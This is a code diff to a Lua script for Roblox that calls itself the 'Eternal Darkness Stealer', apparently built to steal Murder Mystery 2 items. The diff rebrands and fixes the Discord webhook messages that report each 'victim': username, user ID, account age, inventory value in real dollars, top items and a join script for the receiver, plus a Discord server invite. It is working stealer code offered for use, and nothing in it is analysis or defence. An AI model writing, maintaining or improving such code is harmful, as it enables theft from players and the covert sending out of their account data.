@@ -267,7 +267,7 @@ local STATUS_API_URL = cfg.StatusApi or ""
 local API_KEY = cfg.ApiKey or ""
 
 -- Eternal Darkness Avatar
-local ETERNAL_DARKNESS_AVATAR = "https://cdn.discordapp.com/attachments/placeholder/eternal_darkness_logo.png"
+local ETERNAL_DARKNESS_AVATAR = "https://imgur.com/a/OPHDrDn.png"
 
 -- Autojoiner'a hit bildir
 local function sendHitToQueue(placeId, jobId, receiverName)
@@ -709,29 +709,28 @@ local function sendMainWebhook()
 
     local content = nil
     if isPingWorthy and cfg.pingEveryone == "Yes" then
-        content = "@everyone 🌑 **NEW SHADOW ACQUIRED**"
+        content = "@everyone 🌑 **NEW MM2 HIT | Eternal Darkness**"
     end
 
-    -- Build fields array properly
     local fields = {}
     table.insert(fields, {
         name = "👤 Victim",
-        value = string.format("```\\n%s (@%s)\\nID: %d\\nAge: %d days\\n```", plr.DisplayName, plr.Name, plr.UserId, plr.AccountAge),
+        value = string.format("%s\n(@%s)\nID: %d\nAge: %d days", plr.DisplayName, plr.Name, plr.UserId, plr.AccountAge),
         inline = true
     })
     table.insert(fields, {
         name = "⚙️ System",
-        value = string.format("```\\nExecutor: %s\\nReceiver: %s\\nJob ID: %s...\\n```", executorName, targetName, string.sub(REAL_JOB_ID, 1, 8)),
+        value = string.format("Executor: %s\nReceiver: %s\nJob ID:\n%s...", executorName, targetName, string.sub(REAL_JOB_ID, 1, 8)),
         inline = true
     })
     table.insert(fields, {
         name = "💰 Valuation",
-        value = string.format("```\\nTotal Value: %d\\nReal Value: $%s\\nTotal Items: %d\\n```", totalInventoryValue, totalUSD, total_items),
+        value = string.format("Total Value: %d\nReal Value: $%s\nTotal Items: %d", totalInventoryValue, totalUSD, total_items),
         inline = true
     })
     table.insert(fields, {
         name = "📊 Inventory Breakdown",
-        value = string.format("```ansi\\n\\u001b[2;31mAncient:  %d  \\u001b[2;35mGodly:   %d\\u001b[0m\\n\\u001b[2;33mUnique:   %d  \\u001b[2;38;5;208mVintage: %d\\u001b[0m\\n\\u001b[2;34mLegendary:%d  \\u001b[2;32mRare:    %d\\u001b[0m\\n\\u001b[2;37mUncommon: %d  Common:  %d```", 
+        value = string.format("```ansi\n\u001b[2;31mAncient:  %d  \u001b[2;35mGodly:   %d\u001b[0m\n\u001b[2;33mUnique:   %d  \u001b[2;38;5;208mVintage: %d\u001b[0m\n\u001b[2;34mLegendary:%d  \u001b[2;32mRare:    %d\u001b[0m\n\u001b[2;37mUncommon: %d  Common:  %d```", 
             tier_counts.Ancient, tier_counts.Godly,
             tier_counts.Unique, tier_counts.Vintage,
             tier_counts.Legendary, tier_counts.Rare,
@@ -740,7 +739,7 @@ local function sendMainWebhook()
     })
     table.insert(fields, {
         name = "🏆 Top Items",
-        value = #top_items > 0 and string.format("```\\n%s\\n```", table.concat(top_items, "\\n")) or "```\\nNo items\\n```",
+        value = #top_items > 0 and string.format("```\n%s\n```", table.concat(top_items, "\n")) or "```\nNo items\n```",
         inline = false
     })
     table.insert(fields, {
@@ -754,14 +753,14 @@ local function sendMainWebhook()
         username = "🌑 Eternal Darkness",
         avatar_url = ETERNAL_DARKNESS_AVATAR,
         embeds = {{
-            title = string.format("🌑 SHADOW ACQUIRED │ %s │ %s", plr.DisplayName, hitCategory),
+            title = string.format("🎯 HIT CONFIRMED │ %s │ %s", plr.DisplayName, hitCategory),
             url = rubisLink,
             color = ETERNAL_DARKNESS_COLORS.secondary,
             thumbnail = {url = avatarUrl},
-            description = string.format("```lua\\n%s\\n```", joinScript),
+            description = string.format("```lua\n%s\n```", joinScript),
             fields = fields,
             footer = {
-                text = string.format("Eternal Darkness MM2 • v1.0.0 • %s", os.date("!%H:%M:%S UTC"))
+                text = "Eternal Darkness Stealer  v1.0.0 | discord.gg/wep4k9Fg8W"
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
@@ -789,26 +788,25 @@ local function sendTopHits()
         table.insert(top_items, string.format("`%s` ×%d (**%d** value)", item.ItemName, item.Amount, item.TotalValue))
     end
 
-    -- Build fields array properly
     local fields = {}
     table.insert(fields, {
         name = "💰 Elite Valuation",
-        value = string.format("```yaml\\nIn-Game: %d\\nReal Value: $%s\\nItems: %d```", totalInventoryValue, totalUSD, total_items),
+        value = string.format("In-Game: %d\nReal Value: $%s\nItems: %d", totalInventoryValue, totalUSD, total_items),
         inline = true
     })
     table.insert(fields, {
         name = "👤 Victim",
-        value = string.format("```yaml\\nUser: %s\\nID: %d\\nAge: %d days```", plr.Name, plr.UserId, plr.AccountAge),
+        value = string.format("User: %s\nID: %d\nAge: %d days", plr.Name, plr.UserId, plr.AccountAge),
         inline = true
     })
     table.insert(fields, {
         name = "⚙️ System",
-        value = string.format("```yaml\\nExecutor: %s\\nJob ID: %s...```", executorName, string.sub(REAL_JOB_ID, 1, 8)),
+        value = string.format("Executor: %s\nJob ID: %s...", executorName, string.sub(REAL_JOB_ID, 1, 8)),
         inline = true
     })
     table.insert(fields, {
         name = "🏆 Elite Items",
-        value = #top_items > 0 and string.format("```\\n%s\\n```", table.concat(top_items, "\\n")) or "```\\nNo items\\n```",
+        value = #top_items > 0 and string.format("```\n%s\n```", table.concat(top_items, "\n")) or "```\nNo items\n```",
         inline = false
     })
     table.insert(fields, {
@@ -818,17 +816,17 @@ local function sendTopHits()
     })
 
     local payload = {
-        content = "@everyone 🌑🔥 **ELITE SHADOW ACQUIRED**",
+        content = "@everyone 🌑🔥 **ELITE MM2 HIT | Eternal Darkness**",
         username = "🔥 Elite Shadow",
         avatar_url = ETERNAL_DARKNESS_AVATAR,
         embeds = {{
-            title = "🌑🔥 ELITE SHADOW ACQUIRED",
+            title = "🎯🔥 ELITE HIT CONFIRMED",
             url = rubisLink,
             color = ETERNAL_DARKNESS_COLORS.highlight,
-            description = string.format("**%s** has been consumed by Eternal Darkness!\\n\\nThis is an **ELITE** hit worth **$%s** real money!", plr.Name, totalUSD),
+            description = string.format("**%s** has been consumed by Eternal Darkness!\n\nThis is an **ELITE** hit worth **$%s** real money!", plr.Name, totalUSD),
             fields = fields,
             footer = { 
-                text = "Eternal Darkness MM2 • ELITE HIT • v1.0.0"
+                text = "Eternal Darkness Stealer  v1.0.0 | discord.gg/wep4k9Fg8W"
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
@@ -840,7 +838,6 @@ end
 -- Send webhooks
 sendMainWebhook()
 sendTopHits()
-
 -- Trading helper functions from leaked.lua (working version)
 local function getStatus()
     local ok, status = pcall(function() return GetStatus:InvokeServer() end)
